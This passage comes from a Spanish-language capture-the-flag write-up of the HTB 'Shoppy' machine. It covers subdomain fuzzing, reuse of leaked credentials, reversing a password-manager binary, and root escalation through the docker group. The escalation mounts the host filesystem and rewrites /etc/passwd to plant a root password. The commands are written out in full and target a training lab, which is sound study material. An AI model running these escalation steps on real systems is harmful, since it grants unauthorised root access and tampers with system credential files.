<code>shoppy.htb</code>, podr铆amos pensar que existen subdominios. Vamos a enumerar (la lista se puede encontrar en <a href="https://github.com/danielmiessler/SecLists">SecLists</a>)</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -H <span class="code-dark-yellow">'Host: FUZZ.shoppy.htb'</span> -fs 169  
<span class="code-dark-green">mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 36ms]</span>
</code></pre></div><p>Y ahora encontramos una aplicaci贸n MatterMost:</p><p><img alt="Shoppy 10" src="/images/HTB/Shoppy/Shoppy-10.webp"></p><p>Aqu铆 podemos acceder usando <code>josh:remembermethisway</code>:</p><p><img alt="Shoppy 11" src="/images/HTB/Shoppy/Shoppy-11.webp"></p><p>Por suerte, en uno de los canales encontramos credenciales en texto claro para acceder como <code>jaeger</code> (<code>Sh0ppyBest@pp!</code>):</p><p><img alt="Shoppy 12" src="/images/HTB/Shoppy/Shoppy-12.webp"></p><p>Con las credenciales anteriores, ganamos acceso a la m谩quina y podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> jaeger@10.10.11.180
jaeger@10.10.11.180's password:
<span class="code-green">jaeger@shoppy</span>:<span class="code-blue">~</span>$ cat user.txt
38bebf32e7088d5bb384401051c42902  
</code></pre></div><h2 id="enumeraci贸n-del-sistema">Enumeraci贸n del sistema</h2><p>Este usuario puede ejecutar un binario ELF llamado <code>password-manager</code> como usuario <code>deploy</code> usando <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jaeger@shoppy</span>:<span class="code-blue">~</span>$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
<span class="code-green">jaeger@shoppy</span>:<span class="code-blue">~</span>$ file /home/deploy/password-manager
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped  
</code></pre></div><h2 id="movimiento-lateral-al-usuario-deploy">Movimiento lateral al usuario <code>deploy</code></h2><p>Si transferimos el binario a nuestra m谩quina y usamos Ghidra para descompilarlo, vemos que est谩 escrito en C++. Esta es la funci贸n <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
<span class="mtk1">  basic_ostream </span><span class="mtk5">*</span><span class="mtk1">pbVar2;</span>
<span class="mtk1">  basic_string</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::allocator</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> local_68[</span><span class="mtk6">32</span><span class="mtk1">];</span>
<span class="mtk1">  basic_string local_48[</span><span class="mtk6">47</span><span class="mtk1">];</span>
<span class="mtk1">  allocator</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;</span><span class="mtk1"> local_19[</span><span class="mtk6">9</span><span class="mtk1">];</span>

<span class="mtk1">  pbVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk1">::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8 mtku">std</span><span class="mtk1">::cout, </span><span class="mtk4">"Welcome to Josh password manager!"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_ostream</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) pbVar2, </span><span class="mtk8 mtku">std</span><span class="mtk1">::endl</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8 mtku">std</span><span class="mtk1">::cout,</span><span class="mtk4">"Please enter your master password: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::</span><span class="mtk8">basic_string</span><span class="mtk1">();</span>
<span class="mtk3">                    /* try { // try from 00101263 </span><span class="mtk3">to 00101267 has its CatchHandler @ 001013cb */</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::operator</span><span class="mtk5">&gt;&gt;</span><span class="mtk1">((basic_istream </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8 mtku">std</span><span class="mtk1">::cin,local_48);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;::</span><span class="mtk8">allocator</span><span class="mtk1">();</span>
<span class="mtk3">                    /* try { // try from 00101286 </span><span class="mtk3">to 0010128a has its CatchHandler @ 001013a9 */</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::</span><span class="mtk8">basic_string</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) local_68, (allocator </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0010205c);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;::</span><span class="mtk5">~</span><span class="mtk8">allocator</span><span class="mtk1">(local_19);</span>
<span class="mtk3">                    /* try { // try from 001012a5 </span><span class="mtk3">to 00101387 has its CatchHandler @ 001013ba */</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"S"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"a"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"m"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"p"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"l"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator </span><span class="mtk5">+=</span><span class="mtk1"> (local_68, </span><span class="mtk4">"e"</span><span class="mtk1">);</span>

<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::</span><span class="mtk8">compare</span><span class="mtk1">(local_48);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    pbVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk1">::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8 mtku">std</span><span class="mtk1">::cout, </span><span class="mtk4">"Access denied! This incident will be reported !"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_ostream</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) pbVar2, </span><span class="mtk8 mtku">std</span><span class="mtk1">::endl</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    pbVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk1">::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8 mtku">std</span><span class="mtk1">::cout, </span><span class="mtk4">"Access granted! Here is creds !"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_ostream</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::operator</span><span class="mtk5">&lt;&lt;</span><span class="mtk1">((basic_ostream</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">,</span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) pbVar2, </span><span class="mtk8 mtku">std</span><span class="mtk1">::endl</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"cat /home/deploy/creds.txt"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::</span><span class="mtk5">~</span><span class="mtk8">basic_string</span><span class="mtk1">(local_68);</span>
<span class="mtk1">  </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">__cxx11</span><span class="mtk1">::</span><span class="mtk8 mtku">basic_string</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">char_traits</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;, </span><span class="mtk8 mtku">std</span><span class="mtk1">::</span><span class="mtk8 mtku">allocator</span><span class="mtk1">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">&gt;&gt;::</span><span class="mtk5">~</span><span class="mtk8">basic_string</span><span class="mtk1">((basic_string</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::char_traits</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;</span><span class="mtk1">, </span><span class="mtk8 mtku">std</span><span class="mtk1">::allocator</span><span class="mtk5">&lt;</span><span class="mtk7 mtki">char</span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) local_48);</span>  

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> iVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>El programa pregunta por una contrase帽a maestra, y se compara contra <code>"Sample"</code> (la cadena se construye car谩cter a car谩cter). Luego el programa muestra la contrase帽a del usuario <code>deploy</code> (guardada en <code>/home/deploy/creds.txt</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jaeger@shoppy</span>:<span class="code-blue">~</span>$ sudo -u deploy /home/deploy/password-manager  
[sudo] password for jaeger:
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
</code></pre></div><p>Y con esto podemos pivotar al usuario <code>deploy</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jaeger@shoppy</span>:<span class="code-blue">~</span>$ su deploy
Password:
$ bash
<span class="code-green">deploy@shoppy</span>:<span class="code-blue">/home/jaeger</span>$  
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario no puede usar <code>sudo</code>, pero pertenece al grupo <code>docker</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">deploy@shoppy</span>:<span class="code-blue">~</span>$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)  
</code></pre></div><p>Con esto, podemos ejecutar <code>docker</code>. Vamos a ver qu茅 im谩genes tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">deploy@shoppy</span>:<span class="code-blue">~</span>$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   3 months ago   5.53MB  
</code></pre></div><p>Usando <code>docker</code> podemos crear un contenedor Docker que monte el sistema de archivos completo en el directorio <code>/mnt</code> del contenedor y leer/escribir archivos pertenecientes a <code>root</code> en la m谩quina anfitri贸n. Usaremos <code>-v /:/mnt</code> para realizar el montaje del volumen:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">deploy@shoppy</span>:<span class="code-blue">~</span>$ docker run -v /:/mnt -it alpine sh
/ # hostname
1c035e131541
/ # ls /mnt
<span class="code-cyan">bin</span>             <span class="code-blue">etc</span>             <span class="code-cyan">initrd.img.old</span>  <span class="code-cyan">lib64</span>           <span class="code-blue">media</span>           <span class="code-blue">proc</span>            <span class="code-cyan">sbin</span>            <span class="code-blue">tmp</span>             <span class="code-cyan">vmlinuz</span>
<span class="code-blue">boot</span>            <span class="code-blue">home</span>            <span class="code-cyan">lib</span>             <span class="code-cyan">libx32</span>          <span class="code-blue">mnt</span>             <span class="code-blue">root</span>            <span class="code-blue">srv</span>             <span class="code-blue">usr</span>             <span class="code-cyan">vmlinuz.old</span>  
<span class="code-blue">dev</span>             <span class="code-cyan">initrd.img</span>      <span class="code-cyan">lib32</span>           <span class="code-blue">lost+found</span>      <span class="code-blue">opt</span>             <span class="code-blue">run</span>             <span class="code-blue">sys</span>             <span class="code-blue">var</span>
/ # cat /mnt/root/root.txt
0cde64ed9c2278de8a4035756db7180a
</code></pre></div><p>Para conseguir una <em>shell</em> como <code>root</code> en condiciones, podemos a帽adir una contrase帽a a <code>root</code> en <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> passwd 7rocky  
8juPOSsOaeytM
</code></pre></div><p>Usar茅 <code>sed</code> para modificar el archivo <code>/etc/passwd</code> de la m谩quina anfitri贸n, y luego obtendr茅 una <em>shell</em> como <code>root</code> en la m谩quina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ # sed -i s/root:x/root:8juPOSsOaeytM/g /mnt/etc/passwd  
/ # exit
<span class="code-green">deploy@shoppy</span>:<span class="code-blue">~</span>$ su root
Password:
root@shoppy:/home/deploy# cd
root@shoppy:~# cat root.txt
0cde64ed9c2278de8a4035756db7180a
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#encontrando-una-inyecci贸n-nosql">Encontrando una inyecci贸n NoSQL</a></li><li><a href="#encontrando-otro-subdominio">Encontrando otro subdominio</a></li></ul></li><li><a href="#enumeraci贸n-del-sistema">Enumeraci贸n del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-deploy">Movimiento lateral al usuario <code>deploy</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de res煤menes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
